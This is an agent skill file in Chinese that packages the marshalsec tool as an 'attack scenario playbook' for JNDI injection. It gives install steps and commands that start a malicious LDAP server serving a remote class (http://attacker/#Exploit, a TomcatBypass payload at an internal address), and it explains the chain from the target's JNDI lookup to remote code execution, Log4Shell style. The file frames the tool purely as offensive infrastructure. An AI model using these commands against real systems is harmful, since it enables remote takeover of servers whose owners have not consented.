---
name: marshalsec-deser
description: marshalsec: JNDI 注入利用基础设施。信号:pwn,二进制利用,恶意 LDAP,RMI 服务,codebase URL。
---

# marshalsec

- 攻击大类:C46 二进制漏洞利用与Pwn
- 上游仓库:https://github.com/mbechler/marshalsec
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/mbechler/marshalsec && mvn clean package -DskipTests
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker/#Exploit 1389` | 恶意 LDAP |
| `marshalsec.jndi.RMIRefServer` | RMI 服务 |
| `--codebase` | codebase URL |

## 攻击场景 Playbook

### JNDI 注入利用基础设施

```bash
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://10.8.0.2:8080/#TomcatBypass 1389
# 目标 JNDI lookup 指向本机 → 加载远程恶意类 → RCE(Log4Shell 同理)
```

## 注意事项

Java 反序列化/JNDI 攻击瑞士刀;Log4Shell 时代的基础设施标配。
